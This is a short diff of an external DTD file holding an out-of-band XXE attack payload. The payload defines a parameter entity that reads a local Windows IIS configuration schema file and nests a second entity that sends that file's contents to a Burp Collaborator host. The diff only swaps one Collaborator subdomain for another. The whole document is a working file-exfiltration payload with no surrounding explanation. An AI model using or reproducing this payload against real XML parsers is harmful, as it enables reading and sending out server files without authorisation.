@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://e4j5loxf8h8z38cx5q9vuj5e258ywn.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://zx0qe9q0121kwt5iyb2gn4yzvq1kp9.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
